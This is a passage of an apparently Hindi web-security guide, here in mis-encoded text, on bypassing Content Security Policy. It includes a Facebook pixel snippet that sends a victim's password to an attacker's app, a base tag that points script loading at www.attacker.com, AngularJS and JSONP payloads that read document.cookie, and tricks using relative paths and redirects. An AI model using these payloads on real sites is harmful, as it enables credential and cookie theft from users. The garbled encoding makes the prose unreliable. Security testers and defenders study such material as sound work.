| рдПрдЬрд╝реНрдпреВрд░ рд╡реЗрдмрд╕рд╛рдЗрдЯреНрд╕ | *.azurewebsites.net, *.azurestaticapps.net | рдбреЗрдЯрд╛ рдирд┐рдХрд╛рд▓рдирд╛, рдХреЛрдб рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рдирд╛ |
| рд╕реЗрд▓реНрд╕рдлреЛрд░реНрд╕ рд╣реЗрд░реЛрдХреВ | *.herokuapp.com | рдбреЗрдЯрд╛ рдирд┐рдХрд╛рд▓рдирд╛, рдХреЛрдб рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рдирд╛ |
| рдЧреВрдЧрд▓ рдлрд╛рдпрд░рдмреЗрд╕ | *.firebaseapp.com | рдбреЗрдЯрд╛ рдирд┐рдХрд╛рд▓рдирд╛, рдХреЛрдб рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рдирд╛ |

рдпрджрд┐ рдЖрдкрдХреЗ рд▓рдХреНрд╖реНрдп рдХреА рд╕реАрдПрд╕рдкреА рдореЗрдВ рдХрд┐рд╕реА рднреА рдЕрдиреБрдорддрд┐ рдкреНрд░рд╛рдкреНрдд рдбреЛрдореЗрди рдХрд╛ рдкрддрд╛ рдЪрд▓рддрд╛ рд╣реИ, рддреЛ рд╕рдВрднрд╛рд╡рдирд╛ рд╣реИ рдХрд┐ рдЖрдк рддреГрддреАрдп-рдкрдХреНрд╖ рд╕реЗрд╡рд╛ рдкрд░ рдкрдВрдЬреАрдХрд░рдг рдХрд░рдХреЗ рд╕реАрдПрд╕рдкреА рдХреЛ рдмрд╛рдЗрдкрд╛рд╕ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ рдпрд╛ рддреЛ рдЙрд╕ рд╕реЗрд╡рд╛ рдХреЛ рдбреЗрдЯрд╛ рдирд┐рдХрд╛рд▓рдиреЗ рдХреЗ рд▓рд┐рдП рдпрд╛ рдХреЛрдб рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред

рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП, рдпрджрд┐ рдЖрдк рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рд╕реАрдПрд╕рдкреА рдкрд╛рддреЗ рд╣реИрдВ:
```
Content-Security-PolicyтАЛ: default-src 'selfтАЩ www.facebook.com;тАЛ
```
рдпрд╛
```
Content-Security-PolicyтАЛ: connect-src www.facebook.com;тАЛ
```
рдЖрдкрдХреЛ рдбреЗрдЯрд╛ рдХреЛ рдирд┐рдХрд╛рд▓рдиреЗ рдореЗрдВ рд╕рдХреНрд╖рдо рд╣реЛрдирд╛ рдЪрд╛рд╣рд┐рдП, рдЬреИрд╕рд╛ рдХрд┐ [Google Analytics](https://www.humansecurity.com/tech-engineering-blog/exfiltrating-users-private-data-using-google-analytics-to-bypass-csp)/[Google Tag Manager](https://blog.deteact.com/csp-bypass/) рдХреЗ рд╕рд╛рде рд╣рдореЗрд╢рд╛ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рдерд╛ред рдЗрд╕ рдорд╛рдорд▓реЗ рдореЗрдВ, рдЖрдк рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рд╕рд╛рдорд╛рдиреНрдп рдЪрд░рдгреЛрдВ рдХрд╛ рдкрд╛рд▓рди рдХрд░рддреЗ рд╣реИрдВ:

1. рдпрд╣рд╛рдВ рдПрдХ Facebook Developer рдЦрд╛рддрд╛ рдмрдирд╛рдПрдВред
1. рдПрдХ рдирдпрд╛ "Facebook Login" рдРрдк рдмрдирд╛рдПрдВ рдФрд░ "рд╡реЗрдмрд╕рд╛рдЗрдЯ" рдХрд╛ рдЪрдпрди рдХрд░реЗрдВред
1. "рд╕реЗрдЯрд┐рдВрдЧреНрд╕ -> рдореВрд▓" рдкрд░ рдЬрд╛рдПрдВ рдФрд░ рдЕрдкрдирд╛ "рдРрдк рдЖрдИрдбреА" рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВред
1. рдЬрд┐рд╕ рд╕рд╛рдЗрдЯ рд╕реЗ рдЖрдк рдбреЗрдЯрд╛ рдирд┐рдХрд╛рд▓рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ, рдЖрдк рдлреЗрд╕рдмреБрдХ рдПрд╕рдбреАрдХреЗ рдЧреИрдЬреЗрдЯ "fbq" рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ "рдХрд╕реНрдЯрдо рдЗрд╡реЗрдВрдЯ" рдФрд░ рдбреЗрдЯрд╛ рдкреЗрд▓реЛрдб рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рд╕реАрдзреЗ рдбреЗрдЯрд╛ рдирд┐рдХрд╛рд▓ рд╕рдХрддреЗ рд╣реИрдВред
1. рдЕрдкрдиреЗ рдРрдк "рдЗрд╡реЗрдВрдЯ рдкреНрд░рдмрдВрдзрдХ" рдкрд░ рдЬрд╛рдПрдВ рдФрд░ рдЖрдкрдХреЗ рджреНрд╡рд╛рд░рд╛ рдмрдирд╛рдП рдЧрдП рдРрдкреНрд▓рд┐рдХреЗрд╢рди рдХрд╛ рдЪрдпрди рдХрд░реЗрдВ (рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ рдЗрд╡реЗрдВрдЯ рдкреНрд░рдмрдВрдзрдХ рдЗрд╕ рдпреВрдЖрд░рдПрд▓ рдХреЗ рд╕рдорд╛рди рдПрдХ рдпреВрдЖрд░рдПрд▓ рдореЗрдВ рдорд┐рд▓ рд╕рдХрддрд╛ рд╣реИ: https://www.facebook.com/events_manager2/list/pixel/[app-id]/test_events)
1. "рдкрд░реАрдХреНрд╖рдг рдЗрд╡реЗрдВрдЯ" рдЯреИрдм рдХрд╛ рдЪрдпрди рдХрд░реЗрдВ рддрд╛рдХрд┐ "рдЖрдкрдХреА" рд╡реЗрдмрд╕рд╛рдЗрдЯ рджреНрд╡рд╛рд░рд╛ рднреЗрдЬреЗ рдЬрд╛ рд░рд╣реЗ рдЗрд╡реЗрдВрдЯ рджреЗрдЦреЗрдВред

рдлрд┐рд░, рдкреАрдбрд╝рд┐рдд рдкрдХреНрд╖ рдкрд░, рдЖрдк рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдХреЛрдб рдХреЛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рддреЗ рд╣реИрдВ рддрд╛рдХрд┐ рдЖрдк Facebook рдЯреНрд░реИрдХрд┐рдВрдЧ рдкрд┐рдХреНрд╕рд▓ рдХреЛ рдЖрдХреНрд░рдордХ рдХреЗ Facebook рдбреЗрд╡рд▓рдкрд░ рдЦрд╛рддрд╛ рдРрдк-рдЖрдИрдбреА рдкрд░ рдЗрдирд┐рд╢рд┐рдпрд▓рд╛рдЗрдЬрд╝ рдХрд░ рд╕рдХреЗрдВ рдФрд░ рдПрдХ рдХрд╕реНрдЯрдо рдЗрд╡реЗрдВрдЯ рдЬрд╛рд░реА рдХрд░реЗрдВ рдЬреИрд╕реЗ:
```JavaScript
fbq('init', '1279785999289471');тАЛ // this number should be the App ID of the attacker's Meta/Facebook account
fbq('trackCustom', 'My-Custom-Event',{тАЛ
data: "Leaked user password: '"+document.getElementById('user-password').innerText+"'"тАЛ
});
```
рдЬреИрд╕рд╛ рдХрд┐ рдкрд┐рдЫрд▓реЗ рддрд╛рд▓рд┐рдХрд╛ рдореЗрдВ рдирд┐рд░реНрджрд┐рд╖реНрдЯ рд╕рд╛рдд рддреГрддреАрдп-рдкрдХреНрд╖ рдбреЛрдореЗрди рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рд╣реИ, рдЖрдк рдЙрдиреНрд╣реЗрдВ рдЕрдиреНрдп рдХрдИ рддрд░реАрдХреЛрдВ рд╕реЗ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред рдЕрдиреНрдп рддреГрддреАрдп-рдкрдХреНрд╖ рджреБрд░реБрдкрдпреЛрдЧреЛрдВ рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдЕрддрд┐рд░рд┐рдХреНрдд рд╕реНрдкрд╖реНрдЯреАрдХрд░рдг рдХреЗ рд▓рд┐рдП рдкрд╣рд▓реЗ рд╕реЗ рд╣реА [рдмреНрд▓реЙрдЧ рдкреЛрд╕реНрдЯ](https://sensepost.com/blog/2023/dress-codethe-talk/#bypasses) рдХрд╛ рд╕рдВрджрд░реНрдн рджреЗрдВред

### RPO (Relative Path Overwrite) рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдмрд╛рдИрдкрд╛рд╕ <a href="#bypass-via-rpo-relative-path-overwrite" id="bypass-via-rpo-relative-path-overwrite"></a>

рдкрде рдкреНрд░рддрд┐рдмрдВрдзреЛрдВ рдХреЛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЙрдкрд░реЛрдХреНрдд рдкреБрдирд░реНрдирд┐рд░реНрджреЗрд╢рди рдХреЗ рдЕрд▓рд╛рд╡рд╛, рдХреБрдЫ рд╕рд░реНрд╡рд░реЛрдВ рдкрд░ рдПрдХ рдФрд░ рддрдХрдиреАрдХ рд╣реИ рдЬрд┐рд╕реЗ Relative Path Overwrite (RPO) рдХрд╣рд╛ рдЬрд╛рддрд╛ рд╣реИред

рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП, рдпрджрд┐ CSP `https://example.com/scripts/react/` рдкрде рдХреЛ рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИ, рддреЛ рдЗрд╕реЗ рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рддрд░реАрдХреЗ рд╕реЗ рдмрд╛рдИрдкрд╛рд╕ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ:
```html
<script src="https://example.com/scripts/react/..%2fangular%2fangular.js"></script>
```
рдмреНрд░рд╛рдЙрдЬрд╝рд░ рдЕрдВрддрддрдГ `https://example.com/scripts/angular/angular.js` рд▓реЛрдб рдХрд░реЗрдЧрд╛ред

рдпрд╣ рдХрд╛рдо рдХрд░рддрд╛ рд╣реИ рдХреНрдпреЛрдВрдХрд┐ рдмреНрд░рд╛рдЙрдЬрд╝рд░ рдХреЗ рд▓рд┐рдП рдЖрдк `https://example.com/scripts/react/` рдХреЗ рдиреАрдЪреЗ рд╕реНрдерд┐рдд `..%2fangular%2fangular.js` рдирд╛рдордХ рдлрд╝рд╛рдЗрд▓ рд▓реЛрдб рдХрд░ рд░рд╣реЗ рд╣реИрдВ, рдЬреЛ CSP рдХреЗ рдЕрдиреБрд░реВрдк рд╣реИред

рд╣рд╛рд▓рд╛рдВрдХрд┐, рдХреБрдЫ рд╕рд░реНрд╡рд░реЛрдВ рдХреЗ рд▓рд┐рдП, рдЬрдм рдЕрдиреБрд░реЛрдз рдкреНрд░рд╛рдкреНрдд рдХрд░рддреЗ рд╣реИрдВ, рд╡реЗ рдЗрд╕реЗ рдбрд┐рдХреЛрдб рдХрд░реЗрдВрдЧреЗ, рдЕрд╕рд░рджрд╛рд░ рд░реВрдк рд╕реЗ `https://example.com/scripts/react/../angular/angular.js` рдХрд╛ рдЕрдиреБрд░реЛрдз рдХрд░рддреЗ рд╣реИрдВ, рдЬреЛ `https://example.com/scripts/angular/angular.js` рдХреЗ рд╕рдорд╛рди рд╣реИред

**рдмреНрд░рд╛рдЙрдЬрд╝рд░ рдФрд░ рд╕рд░реНрд╡рд░ рдХреЗ рдмреАрдЪ URL рд╡реНрдпрд╛рдЦреНрдпрд╛ рдореЗрдВ рдЕрд╕рдВрдЧрддрд┐ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдкрде рдирд┐рдпрдореЛрдВ рдХреЛ рдЙрд▓реНрд▓рдВрдШрди рдХрд░рдХреЗ** рдЗрд╕реЗ рдмрд╛рдИрдкрд╛рд╕ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред

рд╕рдорд╕реНрдпрд╛ рдХрд╛ рд╕рдорд╛рдзрд╛рди рд╕рд░реНрд╡рд░-рд╕рд╛рдЗрдб рдкрд░ `%2f` рдХреЛ `/` рдХреЗ рд░реВрдк рдореЗрдВ рди рд▓реЗрдирд╛ рд╣реИ, рдЗрд╕рд╕реЗ рдмреНрд░рд╛рдЙрдЬрд╝рд░ рдФрд░ рд╕рд░реНрд╡рд░ рдХреЗ рдмреАрдЪ рд╕рдВрдЧрдд рд╡реНрдпрд╛рдЦреНрдпрд╛ рд╕реБрдирд┐рд╢реНрдЪрд┐рдд рд╣реЛрдЧреА рдФрд░ рдЗрд╕ рд╕рдорд╕реНрдпрд╛ рд╕реЗ рдмрдЪрд╛ рдЬрд╛ рд╕рдХреЗрдЧрд╛ред

рдСрдирд▓рд╛рдЗрди рдЙрджрд╛рд╣рд░рдг: [ ](https://jsbin.com/werevijewa/edit?html,output)[https://jsbin.com/werevijewa/edit?html,output](https://jsbin.com/werevijewa/edit?html,output)

### Iframes JS execution

{% content-ref url="../xss-cross-site-scripting/iframes-in-xss-and-csp.md" %}
[iframes-in-xss-and-csp.md](../xss-cross-site-scripting/iframes-in-xss-and-csp.md)
{% endcontent-ref %}

### рдЧрд╛рдпрдм **base-uri**

рдпрджрд┐ **base-uri** рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛ рдЕрдиреБрдкрд╕реНрдерд┐рдд рд╣реИ, рддреЛ рдЖрдк рдЗрд╕рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░рдХреЗ [**рдбреИрдВрдЧрд▓рд┐рдВрдЧ рдорд╛рд░реНрдХрдЕрдк рдЗрдВрдЬреЗрдХреНрд╢рди**](../dangling-markup-html-scriptless-injection/) рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред

рдЗрд╕рдХреЗ рдЕрд▓рд╛рд╡рд╛, рдпрджрд┐ рдкреГрд╖реНрда рдПрдХ рд╕рдВрдмрдВрдзрд┐рдд рдкрде рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рд╕реНрдХреНрд░рд┐рдкреНрдЯ рд▓реЛрдб рдХрд░ рд░рд╣рд╛ рд╣реИ (рдЬреИрд╕реЗ `<script src="/js/app.js">`) рдФрд░ рдПрдХ **Nonce** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд░рд╣рд╛ рд╣реИ, рддреЛ рдЖрдк **base** **tag** рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░рдХреЗ рдЗрд╕реЗ рдЕрдкрдиреЗ рд╕рд░реНрд╡рд░ рд╕реЗ рд╕реНрдХреНрд░рд┐рдкреНрдЯ рд▓реЛрдб рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ XSS рдкреНрд░рд╛рдкреНрдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред\
рдпрджрд┐ рд╡рд┐рдХрд▓реНрдкрд╢реАрд▓ рдкреГрд╖реНрда **httpS** рдХреЗ рд╕рд╛рде рд▓реЛрдб рд╣реЛрддрд╛ рд╣реИ, рддреЛ рдмреЗрд╕ рдореЗрдВ рдПрдХ httpS url рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдВред
```html
<base href="https://www.attacker.com/">
```
### AngularJS рдЗрд╡реЗрдВрдЯреНрд╕

рдирд┐рд░реНрджрд┐рд╖реНрдЯ рдиреАрддрд┐ рдХреЗ рдЖрдзрд╛рд░ рдкрд░, рд╕реАрдПрд╕рдкреА рдЬрд╛рд╡рд╛рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдЗрд╡реЗрдВрдЯреНрд╕ рдХреЛ рдмреНрд▓реЙрдХ рдХрд░реЗрдЧрд╛ред рд╣рд╛рд▓рд╛рдВрдХрд┐, AngularJS рдЕрдкрдиреЗ рдЦреБрдж рдХреЗ рдЗрд╡реЗрдВрдЯреНрд╕ рдХреЛ рдкрд░рд┐рднрд╛рд╖рд┐рдд рдХрд░рддрд╛ рд╣реИ рдЬреЛ рдЙрдкрдпреЛрдЧ рдХрд┐рдП рдЬрд╛ рд╕рдХрддреЗ рд╣реИрдВред рдЬрдм рдПрдХ рдЗрд╡реЗрдВрдЯ рдХреЗ рднреАрддрд░ рд╣реЛрддреЗ рд╣реИрдВ, рддреЛ AngularJS рдПрдХ рд╡рд┐рд╢реЗрд╖ `$event` рдСрдмреНрдЬреЗрдХреНрдЯ рдкрд░рд┐рднрд╛рд╖рд┐рдд рдХрд░рддрд╛ рд╣реИ, рдЬреЛ рдХреЗрд╡рд▓ рдмреНрд░рд╛рдЙрдЬрд╝рд░ рдЗрд╡реЗрдВрдЯ рдСрдмреНрдЬреЗрдХреНрдЯ рдХреЛ рд╕рдВрджрд░реНрднрд┐рдд рдХрд░рддрд╛ рд╣реИред рдЖрдк рдЗрд╕ рдСрдмреНрдЬреЗрдХреНрдЯ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рд╕реАрдПрд╕рдкреА рдХреЛ рдмрд╛рдЗрдкрд╛рд╕ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред Chrome рдкрд░, `$event/event` рдСрдмреНрдЬреЗрдХреНрдЯ рдкрд░ рдПрдХ рд╡рд┐рд╢реЗрд╖ рдкреНрд░реЙрдкрд░реНрдЯреА рд╣реЛрддреА рд╣реИ рдЬрд┐рд╕рдХрд╛ рдирд╛рдо `path` рд╣реИред рдпрд╣ рдкреНрд░реЙрдкрд░реНрдЯреА рдПрдХ рдСрдмреНрдЬреЗрдХреНрдЯ рдХреЗ рдПрдХ рдРрд░реЗ рдХреЛ рд╕рдВрджрд░реНрднрд┐рдд рдХрд░рддреА рд╣реИ рдЬреЛ рдЗрд╡реЗрдВрдЯ рдХреЛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рддрд╛ рд╣реИред рдЕрдВрддрд┐рдо рдкреНрд░реЙрдкрд░реНрдЯреА рд╣рдореЗрд╢рд╛ `window` рдСрдмреНрдЬреЗрдХреНрдЯ рд╣реЛрддреА рд╣реИ, рдЬрд┐рд╕рдХрд╛ рд╣рдо рд╕реИрдВрдбрдмреЙрдХреНрд╕ рдПрд╕реНрдХреЗрдк рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред рд╣рдо рдЗрд╕ рдРрд░реЗ рдХреЛ `orderBy` рдлрд╝рд┐рд▓реНрдЯрд░ рдХреЛ рдкрд╛рд╕ рдХрд░рдХреЗ рдРрд░реЗ рдХреЛ рдЧрдгрдирд╛ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ рдЕрдВрддрд┐рдо рддрддреНрд╡ (рд╡рд┐рдВрдбреЛ рдСрдмреНрдЬреЗрдХреНрдЯ) рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдПрдХ рдЧреНрд▓реЛрдмрд▓ рдлрд╝рдВрдХреНрд╢рди, рдЬреИрд╕реЗ `alert()` рдХреЛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдХреЛрдб рдЗрд╕реЗ рджрд┐рдЦрд╛рддрд╛ рд╣реИ:
```markup
<input%20id=x%20ng-focus=$event.path|orderBy:%27(z=alert)(document.cookie)%27>#x
?search=<input id=x ng-focus=$event.path|orderBy:'(z=alert)(document.cookie)'>#x
```
**рдЕрдВрдЧреБрд▓рд░ рдмрд╛рдИрдкрд╛рд╕ рдХреЗ рдЕрдиреНрдп рддрд░реАрдХреЛрдВ рдХреЛ рдЦреЛрдЬреЗрдВ** [**https://portswigger.net/web-security/cross-site-scripting/cheat-sheet**](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)

### рдЕрдВрдЧреБрд▓рд░рдЬреЗрдПрд╕ рдФрд░ рд╡реНрд╣рд╛рдЗрдЯрд▓рд┐рд╕реНрдЯреЗрдб рдбреЛрдореЗрди
```
Content-Security-Policy: script-src 'self' ajax.googleapis.com; object-src 'none' ;report-uri /Report-parsing-url;
```
рдпрджрд┐ рдПрдкреНрд▓рд┐рдХреЗрд╢рди angular JS рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд░рд╣реА рд╣реИ рдФрд░ рд╕реНрдХреНрд░рд┐рдкреНрдЯ рд╡реНрд╣рд╛рдЗрдЯрд▓рд┐рд╕реНрдЯреЗрдб рдбреЛрдореЗрди рд╕реЗ рд▓реЛрдб рд╣реЛ рд░рд╣реЗ рд╣реИрдВред рддреЛ рдХреЙрд▓рдмреИрдХ рдлрдВрдХреНрд╢рди рдФрд░ рд╡рд▓реНрдирд░рдмрд▓ рдХреНрд▓рд╛рд╕реЗрд╕ рдХреЛ рдХреЙрд▓ рдХрд░рдХреЗ рдЗрд╕ CSP рдиреАрддрд┐ рдХреЛ рдмрд╛рдИрдкрд╛рд╕ рдХрд░рдирд╛ рд╕рдВрднрд╡ рд╣реИред рдЕрдзрд┐рдХ рд╡рд┐рд╡рд░рдгреЛрдВ рдХреЗ рд▓рд┐рдП рдЗрд╕ рд╢рд╛рдирджрд╛рд░ [рдЧрд┐рдЯ](https://github.com/cure53/XSSChallengeWiki/wiki/H5SC-Minichallenge-3:-%22Sh\*t,-it's-CSP!%22) рд░реЗрдкреЛ рдкрд░ рдЬрд╛рдПрдВред

рдХрд╛рдо рдХрд░рдиреЗ рд╡рд╛рд▓реЗ рдкреЗрд▓реЛрдб:
```html
<script src=//ajax.googleapis.com/ajax/services/feed/find?v=1.0%26callback=alert%26context=1337></script>
ng-app"ng-csp ng-click=$event.view.alert(1337)><script src=//ajax.googleapis.com/ajax/libs/angularjs/1.0.8/angular.js></script>

<!-- no longer working -->
<script src="https://www.googleapis.com/customsearch/v1?callback=alert(1)">
```
рдЕрдиреНрдп JSONP рдЕрдирд┐рдпрдВрддреНрд░рд┐рдд рдХреНрд░рд┐рдпрд╛рдиреНрд╡рдпрди рдЕрдВрдд-рдмрд┐рдВрджреБ [**рдпрд╣рд╛рдВ**](https://github.com/zigoo0/JSONBee/blob/master/jsonp.txt) рдореЗрдВ рдорд┐рд▓ рд╕рдХрддреЗ рд╣реИрдВ (рдЙрдирдореЗрдВ рд╕реЗ рдХреБрдЫ рд╣рдЯрд╛ рджрд┐рдП рдЧрдП рдпрд╛ рдареАрдХ рдХрд┐рдП рдЧрдП рдереЗ)

### рдкреБрдирд░реНрдирд┐рд░реНрджреЗрд╢рди рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдмрд╛рдЗрдкрд╛рд╕

CSP рдХреЛ рд╕рд░реНрд╡рд░-рд╕рд╛рдЗрдб рдкреБрдирд░реНрдирд┐рд░реНрджреЗрд╢рди рдХреЗ рд╕рд╛рде рдХреНрдпрд╛ рд╣реЛрддрд╛ рд╣реИ? рдпрджрд┐ рдкреБрдирд░реНрдирд┐рд░реНрджреЗрд╢рди рдПрдХ рдЕрдиреБрдорддрд┐ рдирд╣реАрдВ рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рд╡рд╛рд▓реЗ рдЕрд▓рдЧ рдореВрд▓ рдХреА рдУрд░ рд▓реЗ рдЬрд╛рддрд╛ рд╣реИ, рддреЛ рдпрд╣ рдЕрд╕рдлрд▓ рд╣реЛ рдЬрд╛рдПрдЧрд╛ред

рд╣рд╛рд▓рд╛рдВрдХрд┐, [CSP рд╕реНрдкреЗрдХ 4.2.2.3. рдкрде рдФрд░ рдкреБрдирд░реНрдирд┐рд░реНрджреЗрд╢](https://www.w3.org/TR/CSP2/#source-list-paths-and-redirects) рдореЗрдВ рджрд┐рдП рдЧрдП рд╡рд┐рд╡рд░рдг рдХреЗ рдЕрдиреБрд╕рд╛рд░, рдпрджрд┐ рдкреБрдирд░реНрдирд┐рд░реНрджреЗрд╢ рдПрдХ рдЕрд▓рдЧ рдкрде рдХреА рдУрд░ рд▓реЗ рдЬрд╛рддрд╛ рд╣реИ, рддреЛ рдпрд╣ рдореВрд▓ рдкреНрд░рддрд┐рдмрдВрдзреЛрдВ рдХреЛ рдмрд╛рдЗрдкрд╛рд╕ рдХрд░ рд╕рдХрддрд╛ рд╣реИред

рдпрд╣рд╛рдВ рдПрдХ рдЙрджрд╛рд╣рд░рдг рд╣реИ:
```html
<!DOCTYPE html>
<html>
<head>
<meta http-equiv="Content-Security-Policy" content="script-src http://localhost:5555 https://www.google.com/a/b/c/d">
</head>
<body>
<div id=userContent>
<script src="https://https://www.google.com/test"></script>
<script src="https://https://www.google.com/a/test"></script>
<script src="http://localhost:5555/301"></script>
</div>
</body>
</html>
```
рдпрджрд┐ CSP рдХреЛ `https://www.google.com/a/b/c/d` рдкрд░ рд╕реЗрдЯ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рдХреНрдпреЛрдВрдХрд┐ рдкрде рдХреЛ рдорд╛рдиреНрдпрддрд╛ рджреА рдЬрд╛рддреА рд╣реИ, рдЗрд╕рд▓рд┐рдП `/test` рдФрд░ `/a/test` рд╕реНрдХреНрд░рд┐рдкреНрдЯ рджреЛрдиреЛрдВ рдХреЛ CSP рджреНрд╡рд╛рд░рд╛ рдЕрд╡рд░реБрджреНрдз рдХрд┐рдпрд╛ рдЬрд╛рдПрдЧрд╛ред

рд╣рд╛рд▓рд╛рдВрдХрд┐, рдЕрдВрддрд┐рдо `http://localhost:5555/301` **рд╕рд░реНрд╡рд░-рд╕рд╛рдЗрдб рдкрд░ `https://www.google.com/complete/search?client=chrome&q=123&jsonp=alert(1)//` рдкрд░ рдкреБрдирд░реНрдирд┐рд░реНрджреЗрд╢рд┐рдд рд╣реЛрдЧрд╛**ред рдпрд╣ рдПрдХ рдкреБрдирд░реНрдирд┐рд░реНрджреЗрд╢рди рд╣реЛрдиреЗ рдХреЗ рдХрд╛рд░рдг, **рдкрде рдХреЛ рдорд╛рдиреНрдпрддрд╛ рдирд╣реАрдВ рджреА рдЬрд╛рддреА рд╣реИ**, рдФрд░ **рд╕реНрдХреНрд░рд┐рдкреНрдЯ рд▓реЛрдб рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ**, рдЗрд╕рд▓рд┐рдП рдкрде рдкреНрд░рддрд┐рдмрдВрдз рдХреЛ рджреВрд░ рдХрд░ рджрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред

рдЗрд╕ рдкреБрдирд░реНрдирд┐рд░реНрджреЗрд╢рди рдХреЗ рд╕рд╛рде, рдпрджрд┐ рдкрде рдкреВрд░реА рддрд░рд╣ рд╕реЗ рдирд┐рд░реНрджрд┐рд╖реНрдЯ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рддреЛ рднреА рдЗрд╕реЗ рдЕрдирджреЗрдЦрд╛ рдХрд┐рдпрд╛ рдЬрд╛рдПрдЧрд╛ред

рдЗрд╕рд▓рд┐рдП, рд╕рдмрд╕реЗ рдЕрдЪреНрдЫрд╛ рд╕рдорд╛рдзрд╛рди рдпрд╣ рд╣реИ рдХрд┐ рд╕реБрдирд┐рд╢реНрдЪрд┐рдд рдХрд┐рдпрд╛ рдЬрд╛рдП рдХрд┐ рд╡реЗрдмрд╕рд╛рдЗрдЯ рдореЗрдВ рдХреЛрдИ рдЦреБрд▓рд╛ рдкреБрдирд░реНрдирд┐рд░реНрджреЗрд╢рди рд╕рдВрдмрдВрдзрд┐рдд рд╕реБрд░рдХреНрд╖рд╛ рд╕рдВрдХрдЯ рдирд╣реАрдВ рд╣реИ рдФрд░ CSP рдирд┐рдпрдореЛрдВ рдореЗрдВ рдЙрдкрдпреЛрдЧ рдХрд┐рдП рдЬрд╛ рд╕рдХрдиреЗ рд╡рд╛рд▓реЗ рдХреЛрдИ рдбреЛрдореЗрди рдирд╣реАрдВ рд╣реИрдВред

### рдбреИрдВрдЧрд▓рд┐рдВрдЧ рдорд╛рд░реНрдХрдЕрдк рдХреЗ рд╕рд╛рде CSP рдХреЛ рдмрд╛рдИрдкрд╛рд╕ рдХрд░реЗрдВ

[рдпрд╣рд╛рдВ](../dangling-markup-html-scriptless-injection/) рдкрдврд╝реЗрдВ рдХрд┐ рдХреИрд╕реЗред

### 'unsafe-inline'; img-src \*; рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ XSS
```
default-src 'self' 'unsafe-inline'; img-src *;
```
`'unsafe-inline'` рдпрд╣ рдЕрд░реНрде рд╣реИ рдХрд┐ рдЖрдк рдХреЛрдб рдХреЗ рдЕрдВрджрд░ рдХрд┐рд╕реА рднреА рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдХреЛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ (XSS рдХреЛрдб рдХреЛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░ рд╕рдХрддрд╛ рд╣реИ) рдФрд░ `img-src *` рдпрд╣ рдЕрд░реНрде рд╣реИ рдХрд┐ рдЖрдк рд╡реЗрдмрдкреЗрдЬ рдореЗрдВ рдХрд┐рд╕реА рднреА рд╕реНрд░реЛрдд рд╕реЗ рдХрд┐рд╕реА рднреА рдЫрд╡рд┐ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред

